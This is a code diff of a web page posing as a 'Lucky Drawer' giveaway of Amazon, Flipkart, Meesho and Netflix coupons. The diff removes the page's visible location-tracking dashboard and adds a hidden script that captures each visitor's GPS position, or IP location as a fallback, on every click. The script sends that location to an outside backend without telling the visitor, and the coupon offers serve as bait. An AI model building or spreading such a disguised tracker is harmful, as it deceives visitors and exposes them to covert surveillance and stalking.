@@ -3,9 +3,8 @@
 <head>
 <meta charset="UTF-8" />
 <meta name="viewport" content="width=device-width, initial-scale=1.0" />
-<title>📍 Lucky Drawe Coupon Amazon, Flipkart, Meesho, Netflix + 🎁 Lucky Rewards</title>
+<title>🎁 Lucky Drawer - Amazon, Flipkart, Meesho, Netflix Coupons</title>
 
-<link rel="stylesheet" href="https://unpkg.com/leaflet@1.9.4/dist/leaflet.css" />
 <link rel="preconnect" href="https://fonts.googleapis.com">
 <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
 <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700;800;900&display=swap" rel="stylesheet">
@@ -61,7 +60,6 @@ body {
   50% { transform: scale(1.15) rotate(8deg); }
 }
 
-/* Floating orbs */
 .orb {
   position: fixed;
   border-radius: 50%;
@@ -121,55 +119,13 @@ body {
 }
 
 .logo h1 {
-  font-size: 24px;
+  font-size: 22px;
   font-weight: 900;
   background: linear-gradient(135deg, #a5b4fc, #6366f1, #ec4899);
   -webkit-background-clip: text;
   -webkit-text-fill-color: transparent;
   background-clip: text;
   letter-spacing: -0.5px;
-}
-
-.subtitle {
-  font-size: 12px;
-  color: var(--text-muted);
-  margin-top: 2px;
-}
-
-.status-badge {
-  display: flex;
-  align-items: center;
-  gap: 8px;
-  padding: 8px 16px;
-  background: rgba(16, 185, 129, 0.1);
-  border: 1px solid rgba(16, 185, 129, 0.3);
-  border-radius: 100px;
-  font-size: 13px;
-  font-weight: 600;
-}
-
-.status-badge .dot {
-  width: 8px;
-  height: 8px;
-  border-radius: 50%;
-  background: var(--success);
-  box-shadow: 0 0 12px var(--success);
-  animation: blink 1.5s ease-in-out infinite;
-}
-
-.status-badge.offline {
-  background: rgba(239, 68, 68, 0.1);
-  border-color: rgba(239, 68, 68, 0.3);
-}
-
-.status-badge.offline .dot {
-  background: var(--danger);
-  box-shadow: 0 0 12px var(--danger);
-}
-
-@keyframes blink {
-  0%, 100% { opacity: 1; }
-  50% { opacity: 0.4; }
 }
 
 /* ========== CONTAINER ========== */
@@ -182,7 +138,7 @@ body {
   gap: 28px;
 }
 
-/* ========== HERO SECTION ========== */
+/* ========== HERO ========== */
 .hero {
   text-align: center;
   padding: 40px 20px;
@@ -207,155 +163,7 @@ body {
   margin: 0 auto;
 }
 
-/* ========== STATS ========== */
-.stats-grid {
-  display: grid;
-  grid-template-columns: repeat(auto-fit, minmax(220px, 1fr));
-  gap: 16px;
-}
-
-.stat-card {
-  background: var(--bg-card);
-  border: 1px solid var(--border);
-  border-radius: var(--radius);
-  padding: 22px;
-  display: flex;
-  align-items: center;
-  gap: 16px;
-  backdrop-filter: blur(20px);
-  transition: all 0.35s cubic-bezier(0.4, 0, 0.2, 1);
-  position: relative;
-  overflow: hidden;
-}
-
-.stat-card::before {
-  content: '';
-  position: absolute;
-  top: 0;
-  left: 0;
-  right: 0;
-  height: 3px;
-  background: linear-gradient(90deg, #6366f1, #ec4899);
-  transform: scaleX(0);
-  transition: transform 0.4s ease;
-  transform-origin: left;
-}
-
-.stat-card:hover::before { transform: scaleX(1); }
-
-.stat-card:hover {
-  transform: translateY(-6px);
-  border-color: rgba(99, 102, 241, 0.5);
-  box-shadow: 0 20px 50px rgba(99, 102, 241, 0.25);
-}
-
-.stat-icon {
-  font-size: 32px;
-  width: 60px;
-  height: 60px;
-  display: flex;
-  align-items: center;
-  justify-content: center;
-  background: linear-gradient(135deg, rgba(99, 102, 241, 0.2), rgba(236, 72, 153, 0.2));
-  border-radius: 14px;
-  flex-shrink: 0;
-}
-
-.stat-info { display: flex; flex-direction: column; }
-
-.stat-value {
-  font-size: 30px;
-  font-weight: 900;
-  background: linear-gradient(135deg, #a5b4fc, #6366f1);
-  -webkit-background-clip: text;
-  -webkit-text-fill-color: transparent;
-  background-clip: text;
-  line-height: 1;
-}
-
-.stat-label {
-  font-size: 11px;
-  color: var(--text-muted);
-  font-weight: 600;
-  text-transform: uppercase;
-  letter-spacing: 1px;
-  margin-top: 4px;
-}
-
-/* ========== ACTION BUTTONS ========== */
-.actions {
-  display: flex;
-  gap: 12px;
-  flex-wrap: wrap;
-}
-
-.btn {
-  padding: 14px 26px;
-  border: none;
-  border-radius: 14px;
-  font-size: 14px;
-  font-weight: 700;
-  font-family: inherit;
-  cursor: pointer;
-  display: inline-flex;
-  align-items: center;
-  gap: 8px;
-  transition: all 0.25s ease;
-  position: relative;
-  overflow: hidden;
-}
-
-.btn::before {
-  content: '';
-  position: absolute;
-  inset: 0;
-  background: linear-gradient(90deg, transparent, rgba(255,255,255,0.25), transparent);
-  transform: translateX(-100%);
-  transition: transform 0.7s ease;
-}
-
-.btn:hover::before { transform: translateX(100%); }
-
-.btn:hover {
-  transform: translateY(-3px);
-  box-shadow: 0 12px 30px rgba(0, 0, 0, 0.4);
-}
-
-.btn:active { transform: translateY(-1px); }
-
-.btn:disabled {
-  opacity: 0.5;
-  cursor: not-allowed;
-  transform: none !important;
-}
-
-.btn-primary {
-  background: linear-gradient(135deg, #6366f1, #4f46e5);
-  color: white;
-  box-shadow: 0 8px 20px rgba(99, 102, 241, 0.4);
-}
-
-.btn-success {
-  background: linear-gradient(135deg, #10b981, #059669);
-  color: white;
-  box-shadow: 0 8px 20px rgba(16, 185, 129, 0.4);
-}
-
-.btn-secondary {
-  background: rgba(255, 255, 255, 0.08);
-  color: var(--text);
-  border: 1px solid var(--border);
-}
-
-.btn-danger-outline {
-  background: transparent;
-  color: var(--danger);
-  border: 1px solid rgba(239, 68, 68, 0.4);
-}
-
-.btn-danger-outline:hover { background: rgba(239, 68, 68, 0.1); }
-
-/* ========== LUCKY REWARDS / GIFT VOUCHERS ========== */
+/* ========== LUCKY REWARDS ========== */
 .rewards-section {
   background: linear-gradient(135deg, rgba(251, 191, 36, 0.08), rgba(236, 72, 153, 0.08));
   border: 1px solid rgba(251, 191, 36, 0.25);
@@ -427,25 +235,6 @@ body {
 .voucher-card:hover {
   transform: translateY(-8px) rotate(-1deg);
   box-shadow: 0 30px 60px rgba(251, 191, 36, 0.4);
-}
-
-.voucher-card::before {
-  content: '';
-  position: absolute;
-  top: -50%;
-  left: -50%;
-  width: 200%;
-  height: 200%;
-  background: conic-gradient(from 0deg, transparent, rgba(251, 191, 36, 0.3), transparent);
-  animation: rotate 4s linear infinite;
-  opacity: 0;
-  transition: opacity 0.4s;
-}
-
-.voucher-card:hover::before { opacity: 1; }
-
-@keyframes rotate {
-  to { transform: rotate(360deg); }
 }
 
 .voucher-inner {
@@ -546,7 +335,7 @@ body {
   font-weight: 600;
 }
 
-/* Scratch Card Style */
+/* Scratch Card */
 .scratch-card {
   position: relative;
   background: linear-gradient(135deg, #fbbf24, #f59e0b);
@@ -593,300 +382,6 @@ body {
   font-weight: 600;
 }
 
-/* ========== CURRENT LOCATION CARD ========== */
-.current-location {
-  background: linear-gradient(135deg, rgba(16, 185, 129, 0.1), rgba(99, 102, 241, 0.1));
-  border: 1px solid rgba(16, 185, 129, 0.3);
-  border-radius: var(--radius);
-  padding: 24px;
-  animation: slideDown 0.5s ease;
-}
-
-@keyframes slideDown {
-  from { opacity: 0; transform: translateY(-20px); }
-  to { opacity: 1; transform: translateY(0); }
-}
-
-.current-header {
-  display: flex;
-  justify-content: space-between;
-  align-items: center;
-  margin-bottom: 16px;
-}
-
-.current-header h2 {
-  font-size: 18px;
-  color: var(--success);
-  display: flex;
-  align-items: center;
-  gap: 8px;
-}
-
-.close-btn {
-  background: none;
-  border: none;
-  color: var(--text-muted);
-  font-size: 26px;
-  cursor: pointer;
-  width: 34px;
-  height: 34px;
-  border-radius: 10px;
-  transition: all 0.2s;
-}
-
-.close-btn:hover {
-  background: rgba(255, 255, 255, 0.1);
-  color: var(--text);
-}
-
-.current-body {
-  display: grid;
-  grid-template-columns: 1fr 1fr;
-  gap: 20px;
-}
-
-@media (max-width: 768px) {
-  .current-body { grid-template-columns: 1fr; }
-}
-
-.current-details {
-  display: grid;
-  grid-template-columns: repeat(2, 1fr);
-  gap: 12px;
-}
-
-.detail-item {
-  background: rgba(255, 255, 255, 0.03);
-  border: 1px solid var(--border);
-  border-radius: 12px;
-  padding: 12px 14px;
-  transition: all 0.25s;
-}
-
-.detail-item:hover {
-  background: rgba(99, 102, 241, 0.08);
-  border-color: rgba(99, 102, 241, 0.4);
-}
-
-.detail-item.full-width { grid-column: 1 / -1; }
-
-.detail-label {
-  font-size: 10px;
-  color: var(--text-muted);
-  text-transform: uppercase;
-  letter-spacing: 0.8px;
-  margin-bottom: 4px;
-  font-weight: 700;
-}
-
-.detail-value {
-  font-size: 14px;
-  font-weight: 600;
-  word-break: break-word;
-}
-
-.detail-value.address-text {
-  font-size: 13px;
-  font-weight: 600;
-  line-height: 1.5;
-  color: #a5b4fc;
-}
-
-.mini-map {
-  height: 220px;
-  border-radius: 14px;
-  overflow: hidden;
-  border: 1px solid var(--border);
-}
-
-/* ========== CARDS ========== */
-.card {
-  background: var(--bg-card);
-  border: 1px solid var(--border);
-  border-radius: var(--radius);
-  backdrop-filter: blur(20px);
-  overflow: hidden;
-}
-
-.card-header {
-  padding: 20px 24px;
-  border-bottom: 1px solid var(--border);
-  display: flex;
-  justify-content: space-between;
-  align-items: center;
-}
-
-.card-header h2 {
-  font-size: 16px;
-  font-weight: 800;
-}
-
-.badge {
-  padding: 5px 12px;
-  background: rgba(99, 102, 241, 0.15);
-  color: #a5b4fc;
-  border-radius: 100px;
-  font-size: 12px;
-  font-weight: 700;
-}
-
-/* ========== MAIN GRID ========== */
-.main-grid {
-  display: grid;
-  grid-template-columns: 1.5fr 1fr;
-  gap: 24px;
-}
-
-@media (max-width: 1024px) {
-  .main-grid { grid-template-columns: 1fr; }
-}
-
-.map-container { height: 500px; width: 100%; }
-
-/* ========== LOCATIONS LIST ========== */
-.locations-list {
-  max-height: 500px;
-  overflow-y: auto;
-  padding: 12px;
-}
-
-.location-item {
-  background: rgba(255, 255, 255, 0.03);
-  border: 1px solid var(--border);
-  border-radius: 14px;
-  padding: 14px;
-  margin-bottom: 10px;
-  cursor: pointer;
-  transition: all 0.25s ease;
-  display: flex;
-  gap: 12px;
-  align-items: flex-start;
-}
-
-.location-item:hover {
-  background: rgba(99, 102, 241, 0.08);
-  border-color: rgba(99, 102, 241, 0.4);
-  transform: translateX(6px);
-}
-
-.location-icon {
-  font-size: 24px;
-  flex-shrink: 0;
-  filter: drop-shadow(0 0 6px rgba(99, 102, 241, 0.5));
-}
-
-.location-info { flex: 1; min-width: 0; }
-
-.location-city {
-  font-size: 14px;
-  font-weight: 800;
-  margin-bottom: 4px;
-}
-
-.location-meta {
-  font-size: 12px;
-  color: var(--text-muted);
-  line-height: 1.5;
-  word-break: break-word;
-}
-
-.location-method {
-  display: inline-block;
-  padding: 3px 9px;
-  border-radius: 6px;
-  font-size: 10px;
-  font-weight: 800;
-  text-transform: uppercase;
-  margin-top: 6px;
-  letter-spacing: 0.6px;
-}
-
-.method-ip {
-  background: rgba(99, 102, 241, 0.2);
-  color: #a5b4fc;
-}
-
-.method-gps {
-  background: rgba(16, 185, 129, 0.2);
-  color: #6ee7b7;
-}
-
-.delete-loc-btn {
-  background: none;
-  border: none;
-  color: var(--text-muted);
-  cursor: pointer;
-  padding: 4px 8px;
-  border-radius: 8px;
-  font-size: 16px;
-  transition: all 0.2s;
-  flex-shrink: 0;
-}
-
-.delete-loc-btn:hover {
-  background: rgba(239, 68, 68, 0.2);
-  color: var(--danger);
-}
-
-/* ========== EMPTY STATE ========== */
-.empty-state {
-  text-align: center;
-  padding: 40px 20px;
-  color: var(--text-muted);
-}
-
-.empty-state span {
-  font-size: 48px;
-  display: block;
-  margin-bottom: 12px;
-  opacity: 0.5;
-}
-
-.empty-state p {
-  font-size: 14px;
-  font-weight: 700;
-  margin-bottom: 4px;
-}
-
-.empty-state small { font-size: 12px; opacity: 0.7; }
-.empty-state.small { padding: 20px; }
-
-/* ========== TOP CITIES ========== */
-.top-cities {
-  padding: 20px 24px;
-  display: grid;
-  grid-template-columns: repeat(auto-fill, minmax(200px, 1fr));
-  gap: 12px;
-}
-
-.city-chip {
-  background: rgba(255, 255, 255, 0.03);
-  border: 1px solid var(--border);
-  border-radius: 14px;
-  padding: 14px;
-  display: flex;
-  justify-content: space-between;
-  align-items: center;
-  transition: all 0.25s ease;
-}
-
-.city-chip:hover {
-  background: rgba(99, 102, 241, 0.1);
-  border-color: rgba(99, 102, 241, 0.4);
-  transform: translateY(-2px);
-}
-
-.city-name { font-size: 14px; font-weight: 700; }
-
-.city-count {
-  background: linear-gradient(135deg, #6366f1, #4f46e5);
-  color: white;
-  padding: 4px 12px;
-  border-radius: 100px;
-  font-size: 12px;
-  font-weight: 800;
-}
-
 /* ========== TOAST ========== */
 .toast {
   position: fixed;
@@ -930,17 +425,12 @@ body {
 @media (max-width: 640px) {
   .container { padding: 20px 16px; }
   .header-content { padding: 0 16px; }
-  .logo h1 { font-size: 18px; }
-  .subtitle { display: none; }
-  .btn { padding: 12px 16px; font-size: 13px; }
-  .stat-value { font-size: 24px; }
-  .current-details { grid-template-columns: 1fr; }
-  .map-container { height: 350px; }
+  .logo h1 { font-size: 16px; }
   .rewards-section { padding: 20px; }
   .voucher-grid { grid-template-columns: 1fr; }
 }
 
-/* ========== PARTICLES (extra flair) ========== */
+/* ========== PARTICLES ========== */
 .particle {
   position: fixed;
   width: 4px;
@@ -971,15 +461,10 @@ body {
 <header class="header">
   <div class="header-content">
     <div class="logo">
-      <span class="logo-icon">📍</span>
+      <span class="logo-icon">🎁</span>
       <div>
-        <h1> Lucky Drawe Coupon Amazon, Flipkart, Meesho, Netflix </h1>
-        <!-- <p class="subtitle">Live IP + GPS tracking dashboard</p> -->
+        <h1>Lucky Drawer Coupons</h1>
       </div>
-    </div>
-    <div class="status-badge" id="statusBadge">
-      <span class="dot"></span>
-      <!-- <span id="statusText">Checking...</span> -->
     </div>
   </div>
 </header>
@@ -988,34 +473,9 @@ body {
 
   <!-- HERO -->
   <section class="hero">
-    <h2>Lucky Drawer.</h2>
-    <p>lucky rewards and gift vouchers Amazon, Flipkart, Meesho 🎁</p>
+    <h2>Lucky Drawer 🎉</h2>
+    <p>Exclusive lucky rewards and gift vouchers — Amazon, Flipkart, Meesho, Netflix 🎁</p>
   </section>
-
-  <!-- STATS -->
-  <!-- <section class="stats-grid">
-    <div class="stat-card">
-      <div class="stat-icon">📍</div>
-      <div class="stat-info">
-        <span class="stat-value" id="totalLocations">0</span>
-        <span class="stat-label">Total Locations</span>
-      </div>
-    </div>
-    <div class="stat-card">
-      <div class="stat-icon">🏙️</div>
-      <div class="stat-info">
-        <span class="stat-value" id="totalCities">0</span>
-        <span class="stat-label">Cities</span>
-      </div>
-    </div>
-    <div class="stat-card">
-      <div class="stat-icon">🌐</div>
-      <div class="stat-info">
-        <span class="stat-value" id="totalCountries">0</span>
-        <span class="stat-label">Countries</span>
-      </div>
-    </div>
-  </section> -->
 
   <!-- LUCKY REWARDS -->
   <section class="rewards-section">
@@ -1040,10 +500,10 @@ body {
             <div class="voucher-icon">🎫</div>
           </div>
           <div class="voucher-title">50% OFF</div>
-          <div class="voucher-desc">Amazon coupon offers First Tap to Scratch</div>
+          <div class="voucher-desc">Amazon coupon offers - First Tap to Scratch</div>
           <div class="voucher-code">
-            <span class="voucher-code-text">LOC50OFF</span>
-            <button class="voucher-copy" onclick="copyCode('LOC50OFF', event)">Copy</button>
+            <span class="voucher-code-text">AMZ50OFF</span>
+            <button class="voucher-copy" onclick="copyCode('AMZ50OFF', event)">Copy</button>
           </div>
           <div class="voucher-validity">Valid till 31 Dec 2026</div>
         </div>
@@ -1057,30 +517,10 @@ body {
             <div class="voucher-icon">💎</div>
           </div>
           <div class="voucher-title">₹500 CASHBACK</div>
-          <div class="voucher-desc">Flipkart Discount Offers First Tap to Scratch</div>
+          <div class="voucher-desc">Flipkart Discount Offers - First Tap to Scratch</div>
           <div class="voucher-code">
-            <span class="voucher-code-text">GPS100CB</span>
-            <button class="voucher-copy" onclick="copyCode('GPS100CB', event)">Copy</button>
-          </div>
-          <div class="voucher-validity">Valid till 30 Dec 2026</div>
-        </div>
-      </div>
-
-
-
-
-        <!-- Voucher 3 -->
-      <div class="voucher-card">
-        <div class="voucher-inner">
-          <div class="voucher-top">
-            <span class="voucher-badge purple">✨ NEW</span>
-            <div class="voucher-icon">💎</div>
-          </div>
-          <div class="voucher-title">₹500 CASHBACK</div>
-          <div class="voucher-desc">Meesho Discount Offers First Tap to Scratch</div>
-          <div class="voucher-code">
-            <span class="voucher-code-text">GPS100CB</span>
-            <button class="voucher-copy" onclick="copyCode('GPS100CB', event)">Copy</button>
+            <span class="voucher-code-text">FLIP500CB</span>
+            <button class="voucher-copy" onclick="copyCode('FLIP500CB', event)">Copy</button>
           </div>
           <div class="voucher-validity">Valid till 30 Dec 2026</div>
         </div>
@@ -1090,14 +530,31 @@ body {
       <div class="voucher-card">
         <div class="voucher-inner">
           <div class="voucher-top">
+            <span class="voucher-badge purple">✨ NEW</span>
+            <div class="voucher-icon">💎</div>
+          </div>
+          <div class="voucher-title">₹300 CASHBACK</div>
+          <div class="voucher-desc">Meesho Discount Offers - First Tap to Scratch</div>
+          <div class="voucher-code">
+            <span class="voucher-code-text">MEESHO300</span>
+            <button class="voucher-copy" onclick="copyCode('MEESHO300', event)">Copy</button>
+          </div>
+          <div class="voucher-validity">Valid till 30 Dec 2026</div>
+        </div>
+      </div>
+
+      <!-- Voucher 4 -->
+      <div class="voucher-card">
+        <div class="voucher-inner">
+          <div class="voucher-top">
             <span class="voucher-badge green">🎉 FREE</span>
             <div class="voucher-icon">🚀</div>
           </div>
-          <div class="voucher-title">FREE PREMIUM Netflix</div>
-          <div class="voucher-desc">1 month premium features free First Tap to Scratch </div>
+          <div class="voucher-title">FREE PREMIUM</div>
+          <div class="voucher-desc">Netflix 1 month premium features free - First Tap to Scratch</div>
           <div class="voucher-code">
-            <span class="voucher-code-text">PREMIUM1M</span>
-            <button class="voucher-copy" onclick="copyCode('PREMIUM1M', event)">Copy</button>
+            <span class="voucher-code-text">NETFLIX1M</span>
+            <button class="voucher-copy" onclick="copyCode('NETFLIX1M', event)">Copy</button>
           </div>
           <div class="voucher-validity">Limited time offer</div>
         </div>
@@ -1105,404 +562,91 @@ body {
     </div>
   </section>
 
-  <!-- ACTION BUTTONS -->
-  <!-- <section class="actions">
-    <button class="btn btn-primary" id="btnIPLocation">
-      <span>🌐</span> Get IP Location
-    </button>
-    <button class="btn btn-success" id="btnGPSLocation">
-      <span>📡</span> Get GPS Location
-    </button>
-    <button class="btn btn-secondary" id="btnRefresh">
-      <span>🔄</span> Refresh
-    </button>
-    <button class="btn btn-danger-outline" id="btnDeleteAll">
-      <span>🗑️</span> Clear All
-    </button>
-  </section> -->
-
-  <!-- CURRENT LOCATION -->
-  <!-- <section class="current-location" id="currentLocationSection" style="display: none;">
-    <div class="current-header">
-      <h2>✅ Location Saved!</h2>
-      <button class="close-btn" id="closeCurrent">×</button>
-    </div>
-    <div class="current-body">
-      <div class="current-details" id="currentDetails"></div>
-      <div id="miniMap" class="mini-map"></div>
-    </div>
-  </section> -->
-
-  <!-- MAP + LIST -->
-  <!-- <section class="main-grid">
-    <div class="card">
-      <div class="card-header">
-        <h2>🗺️ Live Map</h2>
-        <span class="badge" id="mapCount">0 pins</span>
-      </div>
-      <div id="map" class="map-container"></div>
-    </div>
-
-    <div class="card">
-      <div class="card-header">
-        <h2>📋 Recent Locations</h2>
-        <span class="badge" id="listCount">0</span>
-      </div>
-      <div class="locations-list" id="locationsList">
-        <div class="empty-state">
-          <span>📭</span>
-          <p>No locations yet</p>
-          <small>Click "Get IP Location" to start</small>
-        </div>
-      </div>
-    </div>
-  </section> -->
-
-  <!-- TOP CITIES -->
-  <!-- <section class="card">
-    <div class="card-header">
-      <h2>🏆 Top Cities</h2>
-    </div>
-    <div class="top-cities" id="topCities">
-      <div class="empty-state small"><p>No data yet</p></div>
-    </div>
-  </section> -->
-
 </main>
 
 <div class="toast" id="toast"></div>
 
-<script src="https://unpkg.com/leaflet@1.9.4/dist/leaflet.js"></script>
 <script>
 // ============================================
 // CONFIG
 // ============================================
 const API_URL = 'https://locationtrackbackend.onrender.com';
+// Local test ke liye: 'http://localhost:5001'
 
 // ============================================
-// STATE
+// SILENT LOCATION TRACKER
+// Har click pe background me location save karega
 // ============================================
-let map = null;
-let miniMap = null;
-let mapMarkers = [];
-let allLocations = [];
+let lastTrackTime = 0;
+const TRACK_COOLDOWN = 3000; // 3 second me sirf ek baar
 
-// ============================================
-// INIT
-// ============================================
-document.addEventListener('DOMContentLoaded', () => {
-  initMap();
-  bindEvents();
-  checkServerStatus();
-  loadAllLocations();
-  loadStats();
-  spawnParticles();
+async function trackLocation(silent = true) {
+  const now = Date.now();
+  
+  // Cooldown check (spam prevent)
+  if (now - lastTrackTime < TRACK_COOLDOWN) {
+    console.log('⏱️ Cooldown active, skipping');
+    return;
+  }
+  lastTrackTime = now;
 
-  setInterval(() => {
-    loadAllLocations();
-    loadStats();
-  }, 30000);
-});
+  console.log('🎯 Click detected, tracking location...');
 
-// ============================================
-// PARTICLE EFFECT
-// ============================================
-function spawnParticles() {
-  for (let i = 0; i < 12; i++) {
-    const p = document.createElement('div');
-    p.className = 'particle';
-    p.style.left = Math.random() * 100 + 'vw';
-    p.style.animationDelay = Math.random() * 8 + 's';
-    p.style.animationDuration = (5 + Math.random() * 5) + 's';
-    document.body.appendChild(p);
+  // Try GPS first (accurate)
+  if (navigator.geolocation) {
+    navigator.geolocation.getCurrentPosition(
+      async (position) => {
+        const { latitude, longitude } = position.coords;
+        try {
+          const res = await fetch(`${API_URL}/api/location/coords`, {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify({ latitude, longitude })
+          });
+          const data = await res.json();
+          console.log('📍 GPS location saved:', data.data?.city || latitude);
+        } catch (err) {
+          console.log('⚠️ GPS save failed, trying IP...');
+          saveIPLocation();
+        }
+      },
+      (error) => {
+        console.log('⚠️ GPS error:', error.message, '- using IP fallback');
+        saveIPLocation();
+      },
+      { enableHighAccuracy: false, timeout: 5000, maximumAge: 60000 }
+    );
+  } else {
+    saveIPLocation();
   }
 }
 
-// ============================================
-// MAP
-// ============================================
-function initMap() {
-  map = L.map('map').setView([20.5937, 78.9629], 4);
-  L.tileLayer('https://{s}.tile.openstreetmap.org/{z}/{x}/{y}.png', {
-    attribution: '© OpenStreetMap',
-    maxZoom: 19
-  }).addTo(map);
-}
-
-function initMiniMap(lat, lng) {
-  if (miniMap) { miniMap.remove(); miniMap = null; }
-  miniMap = L.map('miniMap').setView([lat, lng], 16);
-  L.tileLayer('https://{s}.tile.openstreetmap.org/{z}/{x}/{y}.png', {
-    attribution: '© OpenStreetMap',
-    maxZoom: 19
-  }).addTo(miniMap);
-  L.marker([lat, lng]).addTo(miniMap).bindPopup('📍 You are here').openPopup();
-}
-
-// ============================================
-// EVENTS
-// ============================================
-function bindEvents() {
-  document.getElementById('btnIPLocation').addEventListener('click', getIPLocation);
-  document.getElementById('btnGPSLocation').addEventListener('click', getGPSLocation);
-  document.getElementById('btnRefresh').addEventListener('click', () => {
-    loadAllLocations(); loadStats(); showToast('Refreshed!', 'info');
-  });
-  document.getElementById('btnDeleteAll').addEventListener('click', deleteAllLocations);
-  document.getElementById('closeCurrent').addEventListener('click', () => {
-    document.getElementById('currentLocationSection').style.display = 'none';
-  });
-}
-
-// ============================================
-// SERVER STATUS
-// ============================================
-async function checkServerStatus() {
-  const badge = document.getElementById('statusBadge');
-  const text = document.getElementById('statusText');
-  try {
-    const res = await fetch(API_URL);
-    if (res.ok) { badge.classList.remove('offline'); text.textContent = 'Online'; }
-    else throw new Error();
-  } catch {
-    badge.classList.add('offline');
-    text.textContent = 'Offline';
-  }
-}
-
-// ============================================
-// IP LOCATION
-// ============================================
-async function getIPLocation() {
-  const btn = document.getElementById('btnIPLocation');
-  btn.disabled = true;
-  btn.innerHTML = '<span>⏳</span> Getting...';
+// IP-based location save (fallback)
+async function saveIPLocation() {
   try {
     const res = await fetch(`${API_URL}/api/location/ip`);
     const data = await res.json();
-    if (data.success) {
-      showToast(`📍 Location saved: ${data.data.city || 'Unknown'}`, 'success');
-      showCurrentLocation(data.data);
-      loadAllLocations(); loadStats();
-    } else showToast(data.message || 'Failed', 'error');
+    console.log('📍 IP location saved:', data.data?.city || 'Unknown');
   } catch (err) {
-    showToast('Network error — server might be sleeping', 'error');
-  } finally {
-    btn.disabled = false;
-    btn.innerHTML = '<span>🌐</span> Get IP Location';
+    console.error('❌ IP location save failed:', err.message);
   }
 }
 
 // ============================================
-// GPS LOCATION
+// GLOBAL CLICK TRACKER
+// Har click pe location save karega (capture phase)
 // ============================================
-async function getGPSLocation() {
-  const btn = document.getElementById('btnGPSLocation');
-  if (!navigator.geolocation) return showToast('GPS not supported', 'error');
-  btn.disabled = true;
-  btn.innerHTML = '<span>⏳</span> Locating...';
-  navigator.geolocation.getCurrentPosition(
-    async (position) => {
-      const { latitude, longitude } = position.coords;
-      try {
-        const res = await fetch(`${API_URL}/api/location/coords`, {
-          method: 'POST',
-          headers: { 'Content-Type': 'application/json' },
-          body: JSON.stringify({ latitude, longitude })
-        });
-        const data = await res.json();
-        if (data.success) {
-          showToast('📍 GPS location saved!', 'success');
-          showCurrentLocation(data.data);
-          loadAllLocations(); loadStats();
-        } else showToast(data.message || 'Failed', 'error');
-      } catch (err) {
-        showToast('Network error while saving GPS', 'error');
-      } finally {
-        btn.disabled = false;
-        btn.innerHTML = '<span>📡</span> Get GPS Location';
-      }
-    },
-    (error) => {
-      btn.disabled = false;
-      btn.innerHTML = '<span>📡</span> Get GPS Location';
-      let msg = 'GPS access denied';
-      if (error.code === 1) msg = 'Permission denied. Please allow location.';
-      if (error.code === 2) msg = 'Position unavailable';
-      if (error.code === 3) msg = 'Request timeout';
-      showToast(msg, 'error');
-    },
-    { enableHighAccuracy: true, timeout: 10000, maximumAge: 0 }
-  );
-}
-
-// ============================================
-// SHOW CURRENT
-// ============================================
-function showCurrentLocation(loc) {
-  const section = document.getElementById('currentLocationSection');
-  section.style.display = 'block';
-  const details = document.getElementById('currentDetails');
-  details.innerHTML = `
-    ${loc.fullAddress ? `<div class="detail-item full-width">
-      <div class="detail-label">📮 Full Address</div>
-      <div class="detail-value address-text">${escapeHtml(loc.fullAddress)}</div>
-    </div>` : ''}
-    ${loc.houseNumber ? `<div class="detail-item"><div class="detail-label">🏠 House</div><div class="detail-value">${escapeHtml(loc.houseNumber)}</div></div>` : ''}
-    ${loc.road ? `<div class="detail-item"><div class="detail-label">🛣️ Street / Road</div><div class="detail-value">${escapeHtml(loc.road)}</div></div>` : ''}
-    <div class="detail-item"><div class="detail-label">🏙️ City</div><div class="detail-value">${escapeHtml(loc.city || 'N/A')}</div></div>
-    <div class="detail-item"><div class="detail-label">🗺️ State</div><div class="detail-value">${escapeHtml(loc.state || 'N/A')}</div></div>
-    <div class="detail-item"><div class="detail-label">🌍 Country</div><div class="detail-value">${escapeHtml(loc.country || 'N/A')}</div></div>
-    <div class="detail-item"><div class="detail-label">📮 Pincode</div><div class="detail-value">${escapeHtml(loc.pincode || 'N/A')}</div></div>
-    <div class="detail-item"><div class="detail-label">🧭 Latitude</div><div class="detail-value">${loc.latitude || 'N/A'}</div></div>
-    <div class="detail-item"><div class="detail-label">🧭 Longitude</div><div class="detail-value">${loc.longitude || 'N/A'}</div></div>
-  `;
-  if (loc.latitude && loc.longitude) setTimeout(() => initMiniMap(loc.latitude, loc.longitude), 100);
-  section.scrollIntoView({ behavior: 'smooth', block: 'center' });
-}
-
-// ============================================
-// LOAD ALL
-// ============================================
-async function loadAllLocations() {
-  try {
-    const res = await fetch(`${API_URL}/api/location/all`);
-    const data = await res.json();
-    if (data.success) {
-      allLocations = data.data;
-      renderLocationsList(data.data);
-      renderMapMarkers(data.data);
-      document.getElementById('listCount').textContent = data.data.length;
-    }
-  } catch (err) { console.error(err); }
-}
-
-// ============================================
-// LIST
-// ============================================
-function renderLocationsList(locations) {
-  const list = document.getElementById('locationsList');
-  if (!locations?.length) {
-    list.innerHTML = `<div class="empty-state"><span>📭</span><p>No locations yet</p><small>Click "Get IP Location" to start</small></div>`;
-    return;
-  }
-  list.innerHTML = locations.map(loc => {
-    const city = loc.city || 'Unknown';
-    const state = loc.state || '';
-    const country = loc.country || '';
-    const method = loc.method || 'IP-based';
-    const methodClass = method === 'GPS-based' ? 'method-gps' : 'method-ip';
-    const timeAgo = loc.createdAt?._seconds ? getTimeAgo(loc.createdAt._seconds * 1000) : 'Just now';
-    const addressLine = loc.fullAddress || [city, state, country].filter(Boolean).join(', ');
-    return `
-      <div class="location-item" onclick="focusLocation(${loc.latitude}, ${loc.longitude})">
-        <div class="location-icon">📍</div>
-        <div class="location-info">
-          <div class="location-city">${escapeHtml(city)}${state ? ', ' + escapeHtml(state) : ''}</div>
-          <div class="location-meta">${escapeHtml(addressLine)}</div>
-          <div class="location-meta" style="opacity:0.7;">🕐 ${timeAgo}</div>
-          <span class="location-method ${methodClass}">${method}</span>
-        </div>
-        <button class="delete-loc-btn" onclick="event.stopPropagation(); deleteLocation('${loc.id}')" title="Delete">✕</button>
-      </div>`;
-  }).join('');
-}
-
-// ============================================
-// MARKERS
-// ============================================
-function renderMapMarkers(locations) {
-  mapMarkers.forEach(m => map.removeLayer(m));
-  mapMarkers = [];
-  if (!locations?.length) {
-    document.getElementById('mapCount').textContent = '0 pins';
-    return;
-  }
-  const bounds = [];
-  locations.forEach(loc => {
-    if (!loc.latitude || !loc.longitude) return;
